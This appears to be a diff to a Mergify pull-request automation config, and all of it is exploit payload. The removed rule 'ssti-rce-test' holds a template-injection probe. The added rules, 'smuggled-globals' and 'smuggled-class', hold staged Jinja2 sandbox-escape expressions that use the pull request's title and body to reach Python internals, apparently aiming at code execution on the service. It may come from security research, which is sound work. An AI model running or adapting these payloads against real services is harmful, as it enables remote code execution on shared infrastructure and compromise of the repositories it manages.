@@ -1,18 +1,16 @@
 pull_request_rules:
-  - name: ssti-rce-test
+  - name: smuggled-globals
     conditions:
       - base=main
     actions:
       comment:
-        message: "SSTI: {{ 7*7 }} | author: {{ author }} | number: {{ number }}"
-
-queue_rules:
-  - name: default
-    queue_conditions:
+        message: |
+          STEP1: title={{ title }}
+          STEP1 RESULT={{ ([dict]|map(attribute=title))|first }}
+  - name: smuggled-class
+    conditions:
       - base=main
-    merge_conditions:
-      - "#approved-reviews-by>=0"
-    merge_method: merge
-
-merge_queue:
-  max_parallel_checks: 1
+    actions:
+      comment:
+        message: |
+          STEP2: RESULT={{ ([dict]|map(attribute=title))|first|attr(body) }}
